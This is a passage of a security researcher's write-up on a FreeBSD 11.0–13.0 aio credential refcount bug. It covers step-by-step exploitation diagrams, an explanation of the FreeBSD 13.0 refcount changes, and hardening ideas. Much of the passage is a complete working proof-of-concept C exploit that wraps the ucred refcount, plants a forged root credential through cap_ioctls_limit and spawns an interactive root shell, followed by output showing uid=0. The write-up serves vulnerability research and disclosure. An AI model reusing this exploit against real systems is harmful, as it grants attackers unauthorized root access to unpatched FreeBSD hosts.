  ┌──────────────┐  ┌─────────────┐
  │  │  │  │
  │  proc  │  │  ucred  │
  │  │───┬───▶│  cr_ref: 2  │
  │  │  │  │  │
  └──────────────┘  │  └─────────────┘
  │  
  │  
  ┌──────────────┐  │  
  │  │  │  
  │  thread  │  │  
  │  │───┘  
  │  │  
  └──────────────┘  

  2. Launch an in-flight AIO job to collect later:

  
  
  ┌──────────────┐  ┌─────────────┐  ┌──────────────┐
  │  │  │  │  │  │
  │  proc  │  │  ucred  │  │  aio job  │
  │  │───┬───▶│  cr_ref: 3  │◀───────│  │
  │  │  │  │  │  │  │
  └──────────────┘  │  └─────────────┘  └──────────────┘
  │  
  │  
  ┌──────────────┐  │  
  │  │  │  
  │  thread  │  │  
  │  │───┘  
  │  │  
  └──────────────┘  

  3. Trigger the vulnerability – this time for `0xffffffff` times, effectively reducing the `cr->cr_ref` by 1. Think of this as erasing memory of the reference held by the in-flight AIO job:

  
  
  ┌──────────────┐  ┌─────────────┐  ┌──────────────┐
  │  │  │  │  │  │
  │  proc  │  │  ucred  │  │  aio job  │
  │  │───┬───▶│  cr_ref: 2  │◀───────│  │
  │  │  │  │  │  │  │
  └──────────────┘  │  └─────────────┘  └──────────────┘
  │  
  │  
  ┌──────────────┐  │  
  │  │  │  
  │  thread  │  │  
  │  │───┘  
  │  │  
  └──────────────┘  

  4. Call `setuid(getuid());` again. This will cause `crfree` on our `ucred` from step 1 due to step 3. Now our in-flight AIO job has a dangling `ucred` pointer:

  
  
  ┌──────────────┐  ┌ ─ ─ ─ ─ ─ ─ ┐  ┌──────────────┐
  │  │  │  │
  │  proc  │  │ free memory │  │  aio job  │
  │  │───┐  ◀───────│  │
  │  │  │  │  │  │  │
  └──────────────┘  │  ─ ─ ─ ─ ─ ─ ─  └──────────────┘
  │  
  │  
  ┌──────────────┐  │  ┌─────────────┐  
  │  │  │  │  │  
  │  thread  │  │  │  ucred  │  
  │  │───┴───▶│  cr_ref: 2  │  
  │  │  │  │  
  └──────────────┘  └─────────────┘  

  5. Use `cap_ioctls_limit` to allocate a fake credential over the freed `ucred` and ensure that fake credential has a refcount of 1:

  
  
  ┌──────────────┐  ┌─────────────┐  ┌──────────────┐
  │  │  │  │  │  │
  │  proc  │  │  ioctl  │  │  aio job  │
  │  │───┐  │  allowlist  │◀──┬────│  │
  │  │  │  │  │  │  │  │
  └──────────────┘  │  └─────────────┘  │  └──────────────┘
  │  │  
  │  │  
  ┌──────────────┐  │  ┌─────────────┐  │  ┌──────────────┐
  │  │  │  │  │  │  │  │
  │  thread  │  │  │  ucred  │  │  │  file  │
  │  │───┴───▶│  cr_ref: 2  │  └────│  │
  │  │  │  │  │  │
  └──────────────┘  └─────────────┘  └──────────────┘

  6. Collect the in-flight AIO job. This will free the `cap_ioctls_limit` buffer, since that’s what the job’s `ucred` pointer is pointing to and it appears to have a `cr_ref` of 1:

  
  
  ┌──────────────┐  ┌ ─ ─ ─ ─ ─ ─ ┐  
  │  │  
  │  proc  │  │ free memory │  
  │  │───┐  ◀──┐  
  │  │  │  │  │  │  
  └──────────────┘  │  ─ ─ ─ ─ ─ ─ ─  │  
  │  │  
  │  │  
  ┌──────────────┐  │  ┌─────────────┐  │  ┌──────────────┐
  │  │  │  │  │  │  │  │
  │  thread  │  │  │  ucred  │  │  │  file  │
  │  │───┴───▶│  cr_ref: 2  │  └────│  │
  │  │  │  │  │  │
  └──────────────┘  └─────────────┘  └──────────────┘

  7. Allocate another fresh credential with `setuid(getuid());`. Again, as the heap is LIFO, this will return a credential with the same virtual address as the `ioctl` allowlist buffer that was just freed:

  
  
  ┌──────────────┐  ┌─────────────┐  
  │  │  │  │  
  │  proc  │  │  ucred  │  
  │  │───┬───▶│  cr_ref: 2  │◀──┐  
  │  │  │  │  │  │  
  └──────────────┘  │  └─────────────┘  │  
  │  │  
  │  │  
  ┌──────────────┐  │  ┌ ─ ─ ─ ─ ─ ─ ┐  │  ┌──────────────┐
  │  │  │  │  │  │
  │  thread  │  │  │ free memory │  │  │  file  │
  │  │───┘  └────│  │
  │  │  │  │  │  │
  └──────────────┘  ─ ─ ─ ─ ─ ─ ─  └──────────────┘

Now we can read the `ucred` structure back to userland through the `cap_ioctls_get` syscall. With our entire `ucred` disclosed, we can fix up whatever we like: `cr_uid`, `cr_ruid`, etc. Increment the refcount while we’re here (I will explain why shortly). Now we need to find a way to put it back.

  8. Use `cap_ioctls_limit` passing a `NULL` allowlist. This instructs the kernel to free any existing allowlist attached to the file – and so our process’ `ucred` is freed:

  
  
  ┌──────────────┐  ┌ ─ ─ ─ ─ ─ ─ ┐  
  │  │  
  │  proc  │  │ free memory │  
  │  │───┬───▶  
  │  │  │  │  │  
  └──────────────┘  │  ─ ─ ─ ─ ─ ─ ─  
  │  
  │  
  ┌──────────────┐  │  ┌ ─ ─ ─ ─ ─ ─ ┐  ┌──────────────┐
  │  │  │  │  │
  │  thread  │  │  │ free memory │  │  file  │
  │  │───┘  │  │
  │  │  │  │  │  │
  └──────────────┘  ─ ─ ─ ─ ─ ─ ─  └──────────────┘

  9. Use `cap_ioctls_limit` again, passing our fixed-up `ucred` as the allowlist. This will be allocated into the virtual address pointed to by our process’ dangling `ucred` pointer:

  
  
  ┌──────────────┐  ┌─────────────┐  
  │  │  │ fake ucred  │  
  │  proc  │  │  cr_ref: 3  │  
  │  │───┬───▶│  cr_uid: 0  │◀──┐  
  │  │  │  │  │  │  
  └──────────────┘  │  └─────────────┘  │  
  │  │  
  │  │  
  ┌──────────────┐  │  ┌ ─ ─ ─ ─ ─ ─ ┐  │  ┌──────────────┐
  │  │  │  │  │  │
  │  thread  │  │  │ free memory │  │  │  file  │
  │  │───┘  └────│  │
  │  │  │  │  │  │
  └──────────────┘  ─ ─ ─ ─ ─ ─ ─  └──────────────┘

  10. With a fixed-up `ucred` in place with legitimate kernel pointers, now we’re safe to call `setuid(getuid());` once more. As we bumped `cr_ref` in step 10, we won’t free anything by doing this, thus ensuring target stability.

  
  
  ┌──────────────┐  ┌─────────────┐  
  │  │  │ fake ucred  │  
  │  proc  │  │  (ioctl  │  
  │  │───┐  │ allowlist)  │◀──┐  
  │  │  │  │  │  │  
  └──────────────┘  │  └─────────────┘  │  
  │  │  
  │  │  
  ┌──────────────┐  │  ┌─────────────┐  │  ┌──────────────┐
  │  │  │  │  ucred  │  │  │  │
  │  thread  │  │  │  cr_ref: 2  │  │  │  file  │
  │  │───┴───▶│  cr_uid: 0  │  └────│  │
  │  │  │  │  │  │
  └──────────────┘  └─────────────┘  └──────────────┘

  11. Enjoy the root life.

## Critical Changes in FreeBSD 13.0

FreeBSD 13.0 brought some interesting changes to how credential refcounts are managed. Let’s explore them a little here.

Taking and releasing references on credentials is a very common operation in the kernel. While these are done with atomics in the code we’ve seen, there is some overhead in using those. To reduce the overhead further, the following changes were made to `crhold`:
  
  
  struct ucred *
  crhold(struct ucred *cr)
  {
  struct thread *td;
  
  td = curthread;
  [1]  if (__predict_true(td->td_realucred == cr)) {
  KASSERT(cr->cr_users > 0, ("%s: users %d not > 0 on cred %p",
  __func__, cr->cr_users, cr));
  [2]  td->td_ucredref++;
  return (cr);
  }
  mtx_lock(&cr->cr_mtx);
  [3]  cr->cr_ref++;
  mtx_unlock(&cr->cr_mtx);
  return (cr);
  }

Notice now that we check if the credential being operated on is exactly the same as the current thread’s [1]. This is by far the most common case, as indicated by the compiler hint `__predict_true`. When this happens, rather than increment the reference count on the `ucred`, we increment a reference count on the thread instead [2].

In the cases where we’re not operating on the current thread’s credential, we do the heavier-weight thing of taking a mutex and incrementing the reference on the `ucred` instead [3].

What’s happening here is that in FreeBSD 13.0, when a credential is assigned to a thread, we increase a different counter: `cr->cr_users`. We then stash the pointer on the thread.

This allows us to avoid using atomics or take locks when doing the common thing: we can just do a plain `++` instead as at [2]. When a credential is being detached from a thread or process, we then go ahead an commit the cumulative `cr_ref` change.

To see how this works in action, let’s investigate what happens when we know a process is going to change its credential: let’s look at `sys_setuid`:
  
  
  int
  sys_setuid(struct thread *td, struct setuid_args *uap)
  {
  ...
  proc_set_cred(p, newcred);
  ...
  }

`proc_set_cred` is used to assign the credential to the proc:
  
  
  void
  proc_set_cred(struct proc *p, struct ucred *newcred)
  {
  struct ucred *cr;
  
  cr = p->p_ucred;
  MPASS(cr != NULL);
  PROC_LOCK_ASSERT(p, MA_OWNED);
  KASSERT(newcred->cr_users == 0, ("%s: users %d not 0 on cred %p",
  __func__, newcred->cr_users, newcred));
  mtx_lock(&cr->cr_mtx);
  KASSERT(cr->cr_users > 0, ("%s: users %d not > 0 on cred %p",
  __func__, cr->cr_users, cr));
  [4]  cr->cr_users--;
  mtx_unlock(&cr->cr_mtx);
  p->p_ucred = newcred;
  [5]  newcred->cr_users = 1;
  [6]  PROC_UPDATE_COW(p);
  }

The old credential has its user count decremented [4] and the new credential has its user count reset to 1 [5] (since we know we’re applying a freshly-cooked `ucred`). Finally, `PROC_UPDATE_COW` is called [6]:
  
  
  #define PROC_UPDATE_COW(p) do {  \
  PROC_LOCK_ASSERT((p), MA_OWNED);  \
  (p)->p_cowgen++;  \
  } while (0)

All that’s happening here is the `p_cowgen` (copy-on-write generation number) is being bumped up.

This change in generation number is picked up when entering the kernel from userland through a system call:
  
  
  static inline void
  syscallenter(struct thread *td)
  {
  struct proc *p;
  ...
  if (__predict_false(td->td_cowgen != p->p_cowgen))
  [7]  thread_cow_update(td);
  ...

At this point, if there’s a mismatch between the process copy-on-write generation number and the thread’s then it means the process credential has changed and we need to commit the cumulative `crhold` / `crfree` calls that we did in our thread. `thread_cow_update` begins this mechanism [7]:
  
  
  void
  thread_cow_update(struct thread *td)
  {
  ...
  struct ucred *oldcred;
  ...
  oldcred = crcowsync();
  ...
  }

That does `crcowsync`:
  
  
  struct ucred *
  crcowsync(void)
  {
  struct thread *td;
  struct proc *p;
  struct ucred *crnew, *crold;
  
  td = curthread;
  p = td->td_proc;
  PROC_LOCK_ASSERT(p, MA_OWNED);
  
  MPASS(td->td_realucred == td->td_ucred);
  if (td->td_realucred == p->p_ucred)
  return (NULL);
  
  [8]  crnew = crcowget(p->p_ucred);
  [9]  crold = crunuse(td);
  [10]  td->td_realucred = crnew;
  td->td_ucred = td->td_realucred;
  return (crold);
  }

We `crcowget` the new process cred [8], `crunuse` the old one [9] and update the credential pointer on the thread so that we’re in sync with the process [10].

`crcowget` is where we bump the new `cr_users` field:
  
  
  struct ucred *
  crcowget(struct ucred *cr)
  {
  
  mtx_lock(&cr->cr_mtx);
  KASSERT(cr->cr_users > 0, ("%s: users %d not > 0 on cred %p",
  __func__, cr->cr_users, cr));
  cr->cr_users++;
  cr->cr_ref++;
  mtx_unlock(&cr->cr_mtx);
  return (cr);
  }

And `crunuse` is where we finally apply the cumulative reference count update [11]:
  
  
  static struct ucred *
  crunuse(struct thread *td)
  {
  struct ucred *cr, *crold;
  
  MPASS(td->td_realucred == td->td_ucred);
  cr = td->td_realucred;
  mtx_lock(&cr->cr_mtx);
  [11]  cr->cr_ref += td->td_ucredref;
  td->td_ucredref = 0;
  KASSERT(cr->cr_users > 0, ("%s: users %d not > 0 on cred %p",
  __func__, cr->cr_users, cr));
  cr->cr_users--;
  if (cr->cr_users == 0) {
  KASSERT(cr->cr_ref > 0, ("%s: ref %d not > 0 on cred %p",
  __func__, cr->cr_ref, cr));
  crold = cr;
  } else {
  cr->cr_ref--;
  crold = NULL;
  }
  mtx_unlock(&cr->cr_mtx);
  td->td_realucred = NULL;
  return (crold);
  }

This is also the reason why the code has moved from using atomics to holding a mutex around updates to `cr_ref`: we’re no longer only ever adding or removing one reference at a time and we also need `cr_ref` to synchronise with `cr_users`. As we’re dealing with two fields, we have no option but to add a mutex and use that.

The real clincher for this vulnerability is that the refcount changes won’t apply to the target `ucred` until this `crunuse` function is reached. So how can we get it exercised?

Well, actually it turns out that the strategy we’re using makes this magically happen: when we call `setuid(getuid());`, we’re going to be committing the refcount changes. As our exploit strategy uses `setuid(getuid());` right after we’ve wrapped the refcount, it means the `cr_ref` field will get updated there and then ready for the rest of our exploit to work as before.

For future reference, if it helps you, an alternative to committing the `td_ucredref` field is to do a `setrlimit`. That will cause the `p_cowgen` to rise and apply any pending refcount changes.

## Proof of Concept Exploit

Here’s the main code for my proof of concept exploit. I’ve omitted utility logging code from the listing here. Tested on FreeBSD 12.3 and 13.0 for aarch64 (virtualised on a Mac):
  
  
  /*
  * FreeBSD 11.0-13.0 aio LPE PoC
  * By [[email protected]](/cdn-cgi/l/email-protection) (@accessvector) / 2022-Jun-26
  */
  #define _WANT_UCRED
  
  #include <ctype.h>
  #include <fcntl.h>
  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>
  #include <strings.h>
  #include <sys/aio.h>
  #include <sys/capsicum.h>
  #include <sys/cpuset.h>
  #include <sys/param.h>
  #include <sys/ucred.h>
  #include <time.h>
  #include <unistd.h>
  
  #include "libpoc.h"
  
  const char *poc_title  = "FreeBSD 11.0-13.0 aio LPE PoC";
  const char *poc_author  = "[[email protected]](/cdn-cgi/l/email-protection) (@accessvector)";
  
  #define HOURS(s)  ((s) / (60 * 60))
  #define MINUTES(s)  (((s) / 60) % 60)
  #define SECONDS(s)  ((s) % 60)
  #define ALIGNUP(a, b)  (((a) + (b) - 1) / (b))
  
  static char dummy = 0;
  static int fd_ucred_1;
  static int fd_ucred_2;
  static struct aiocb vuln_iocb;
  static struct aiocb inflight_iocb = {
  .aio_buf  = &dummy,
  .aio_nbytes  = 1
  };
  
  static void
  pin_to_cpu(size_t which)
  {
  cpuset_t cs;
  
  CPU_ZERO(&cs);
  CPU_SET(which, &cs);
  
  expect(cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_PID, -1,
  sizeof(cs), &cs));
  }
  
  static void
  fresh_ucred(void)
  {
  expect(setuid(getuid()));
  }
  
  static void
  launch_inflight_aio(void)
  {
  expect(aio_read(&inflight_iocb));
  }
  
  static void
  collect_inflight_aio(void)
  {
  struct aiocb *iocbp;
  expect(aio_waitcomplete(&iocbp, NULL));
  }
  
  static void
  bump_ucred_refcount(unsigned int how_much)
  {
  unsigned int n;
  unsigned int percent;
  time_t start_time;
  time_t elapsed;
  time_t remaining;
  
  start_time = time(NULL);
  
  for (n = 0; n < how_much; ++n) {
  if (-1 != aio_fsync(O_SYNC, &vuln_iocb))
  log_fatal("aio_fsync call was unexpectedly successful");
  
  if ((n & 0xfffff) == 0) {
  percent = (unsigned int)(((unsigned long)n * 100) / how_much);
  elapsed = time(NULL) - start_time;
  remaining = (n > 0) ? ((elapsed * (how_much - n)) / n) : 0;
  
  log_progress("Progress: %u / %u (%u%%) (%02u:%02u:%02u elapsed, "
  "%02u:%02u:%02u remaining)...",
  n, how_much, percent,
  HOURS(elapsed), MINUTES(elapsed), SECONDS(elapsed),
  HOURS(remaining), MINUTES(remaining), SECONDS(remaining));
  }
  }
  
  log_progress_complete();
  
  elapsed = time(NULL) - start_time;
  log_info("Wrap completed in %02u:%02u:%02u", HOURS(elapsed),
  MINUTES(elapsed), SECONDS(elapsed));
  }
  
  static void
  allocate_fake_ucred(void)
  {
  cap_ioctl_t buf[ALIGNUP(sizeof(struct ucred), sizeof(cap_ioctl_t))];
  struct ucred *cred = (struct ucred *)buf;
  
  bzero(buf, sizeof(buf));
  cred->cr_ref = 1;
  
  #if __FreeBSD_version >= 1300000
  cred->cr_mtx.lock_object.lo_flags = 0x01030000;
  #endif
  
  expect(cap_ioctls_limit(fd_ucred_1, buf, ARRAYLEN(buf)));
  }
  
  static void
  fixup_ucred(void)
  {
  cap_ioctl_t buf[ALIGNUP(sizeof(struct ucred), sizeof(cap_ioctl_t))];
  struct ucred *cred = (struct ucred *)buf;
  
  bzero(buf, sizeof(buf));
  
  expect(cap_ioctls_get(fd_ucred_1, buf, ARRAYLEN(buf)));
  
  log_hexdump(cred, sizeof(struct ucred), "Read credential uid=%u, gid=%u",
  cred->cr_uid, cred->cr_smallgroups[0]);
  
  cred->cr_ref++;
  cred->cr_uid  = 0;
  cred->cr_ruid  = 0;
  cred->cr_svuid  = 0;
  cred->cr_smallgroups[0] = 0;
  cred->cr_rgid  = 0;
  cred->cr_svgid  = 0;
  
  expect(cap_ioctls_limit(fd_ucred_1, NULL, 0));
  expect(cap_ioctls_limit(fd_ucred_2, buf, ARRAYLEN(buf)));
  }
  
  static void
  drop_shell(void)
  {
  char * const av[] = { "/bin/sh", "-i", NULL };
  char * const ev[] = { "PATH=/bin:/sbin:/usr/bin:/usr/sbin", NULL };
  
  expect(execve(av[0], av, ev));
  }
  
  static void
  setup(void)
  {
  pin_to_cpu(0);
  
  expect(vuln_iocb.aio_fildes = open("/dev/null", O_RDONLY | O_CLOEXEC));
  expect(fd_ucred_1 = open("/etc/passwd", O_RDONLY | O_CLOEXEC));
  expect(fd_ucred_2 = open("/etc/passwd", O_RDONLY | O_CLOEXEC));
  
  expect(inflight_iocb.aio_fildes = open("/etc/passwd", O_RDONLY |
  O_CLOEXEC));
  }
  
  int
  main(int argc, char *argv[])
  {
  banner();
  
  log_info("Setting up");
  setup();
  
  log_info("1. Allocating a fresh credential");
  fresh_ucred();
  
  log_info("2. Launching in-flight async I/O job");
  launch_inflight_aio();
  
  log_info("3. Triggering vulnerability to wrap credential refcount");
  bump_ucred_refcount((unsigned int)-1);
  
  log_info("4. Getting a new credential");
  fresh_ucred();
  
  log_info("5. Allocating fake credential");
  allocate_fake_ucred();
  
  log_info("6. Collecting in-flight async I/O job to free fake credential");
  collect_inflight_aio();
  
  log_info("7. Getting another new credential");
  fresh_ucred();
  
  log_info("8. Fixing up credential");
  fixup_ucred();
  
  log_info("9. Securing a real root credential");
  fresh_ucred();
  
  log_info("10. Enjoy the root life");
  drop_shell();
  
  return 0;
  }

Sample output from running on FreeBSD 13.0:
  
  
  $ uname -msr
  FreeBSD 13.0-RELEASE arm64
  $ make clean all && ./aio
  rm aio
  rm aio.o libpoc.o
  cc  -c -o aio.o aio.c
  cc  -c -o libpoc.o libpoc.c
  cc  -o aio aio.o libpoc.o
  [+] FreeBSD 11.0-13.0 aio LPE PoC
  [+] By [[email protected]](/cdn-cgi/l/email-protection) (@accessvector)
  [+] ---
  [+] Setting up
  [+] 1. Allocating a fresh credential
  [+] 2. Launching in-flight async I/O job
  [+] 3. Triggering vulnerability to wrap credential refcount
  [+] Progress: 4293918720 / 4294967295 (99%) (00:19:25 elapsed, 00:00:00 remaining)...
  [+] Wrap completed in 00:19:25
  [+] 4. Getting a new credential
  [+] 5. Allocating fake credential
  [+] 6. Collecting in-flight async I/O job to free fake credential
  [+] 7. Getting another new credential
  [+] 8. Fixing up credential
  [+] Read credential uid=1001, gid=1001 (256 bytes):
  00000000: 67 c3 8c 00 00 00 ff ff  00 00 03 01 00 00 00 00  |g....... ........|
  00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |........ ........|
  00000020: 02 00 00 00 02 00 00 00  ff ff ff ff 00 00 00 00  |........ ........|
  00000030: 00 00 00 00 00 00 00 00  04 00 00 00 00 00 00 00  |........ ........|
  00000040: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |........ ........|
  00000050: 00 00 00 00 00 00 00 00  e9 03 00 00 e9 03 00 00  |........ ........|
  00000060: e9 03 00 00 01 00 00 00  e9 03 00 00 e9 03 00 00  |........ ........|
  00000070: 80 78 d7 07 00 a0 ff ff  80 78 d7 07 00 a0 ff ff  |.x...... .x......|
  00000080: 00 fb ae 00 00 00 ff ff  40 48 04 00 00 a0 ff ff  |........ @H......|
  00000090: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |........ ........|
  000000a0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |........ ........|
  000000b0: bc 38 fa 07 00 a0 ff ff  10 00 00 00 e9 03 00 00  |.8...... ........|
  000000c0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |........ ........|
  000000d0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |........ ........|
  000000e0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |........ ........|
  000000f0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |........ ........|
  [+] 9. Securing a real root credential
  [+] 10. Enjoy the root life
  # id
  uid=0(root) gid=0(wheel) groups=0(wheel)
  # whoami
  root
  #

FreeBSD 12.3 is pretty much the same, but the `ucred` is slightly smaller:
  
  
  $ uname -msr
  FreeBSD 12.3-RELEASE arm64
  $ make clean all && ./aio
  rm aio
  rm aio.o libpoc.o
  cc  -c -o aio.o aio.c
  cc  -c -o libpoc.o libpoc.c
  cc  -o aio aio.o libpoc.o
  [+] FreeBSD 11.0-13.0 aio LPE PoC
  [+] By [[email protected]](/cdn-cgi/l/email-protection) (@accessvector)
  [+] ---
  [+] Setting up
  [+] 1. Allocating a fresh credential
  [+] 2. Launching in-flight async I/O job
  [+] 3. Triggering vulnerability to wrap credential refcount
  [+] Progress: 4293918720 / 4294967295 (99%) (00:19:15 elapsed, 00:00:00 remaining)...
  [+] Wrap completed in 00:19:15
  [+] 4. Getting a new credential
  [+] 5. Allocating fake credential
  [+] 6. Collecting in-flight async I/O job to free fake credential
  [+] 7. Getting another new credential
  [+] 8. Fixing up credential
  [+] Read credential uid=1001, gid=1001 (224 bytes):
  00000000: 02 00 00 00 e9 03 00 00  e9 03 00 00 e9 03 00 00  |........ ........|
  00000010: 01 00 00 00 e9 03 00 00  e9 03 00 00 00 00 00 00  |........ ........|
  00000020: 00 c7 31 0b 00 fd ff ff  00 c7 31 0b 00 fd ff ff  |..1..... ..1.....|
  00000030: 90 8d 98 00 00 00 ff ff  00 49 05 00 00 fd ff ff  |........ .I......|
  00000040: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |........ ........|
  00000050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |........ ........|
  00000060: ff ff ff ff 00 00 00 00  00 00 00 00 00 00 00 00  |........ ........|
  00000070: 04 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |........ ........|
  00000080: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |........ ........|
  00000090: 9c e7 3e 0b 00 fd ff ff  10 00 00 00 e9 03 00 00  |..>..... ........|
  000000a0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |........ ........|
  000000b0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |........ ........|
  000000c0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |........ ........|
  000000d0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |........ ........|
  [+] 9. Securing a real root credential
  [+] 10. Enjoy the root life
  # id
  uid=0(root) gid=0(wheel) groups=0(wheel)
  # whoami
  root
  #

The PoC will work across other architectures and versions, too, of course, since I’m not relying on anything specific with the exploitation technique.

The full code, including the utility functions, can be found at the end of this article.

## Hardening Opportunities

Beyond fixing the vulnerability directly, there are some observations we can make from our exploitation journey:

  * If `crhold` (and `crunuse` in 13.0+) detected refcount wraps, this bug would be unexploitable for anything other than a DoS.
  * If `ucred`s were allocated from their own specialised zone rather than the general purpose heap, this would make exploitation a little trickier. The approach then would be to try to spawn a legitimate root process after we’d freed our own `ucred` and steal the cred. Target stability is achieved by triggering the vulnerability one more time on the new cred to balance the fact that we stole it.
  * It’s tempting to feel the need to do something about how useful `cap_ioctls_limit` is, but to be honest it’s probably not worth it; there will be other techniques that provide pretty much the same capability.

## Conclusion

All in all, this was a fun bug to exploit. The fact it was a classic refcount bug on a security-critical data structure that lives in the general purpose heap made the exploit development process fairly simple.

Kernel vulnerabilities have been my favourite kind for a long time now: not only is there a clear goal to achieving success, but the range and diversity of syscalls at your disposal to be creative with exploitation is lots of fun. I’ve not come across the Capsicum technique for controlling kernel heap allocations before, but I’m sure it’s known already and there are probably a few other similar gadgets, too.

## PoC Archive

[Download here](freebsd-aio-lpe.tar.gz).
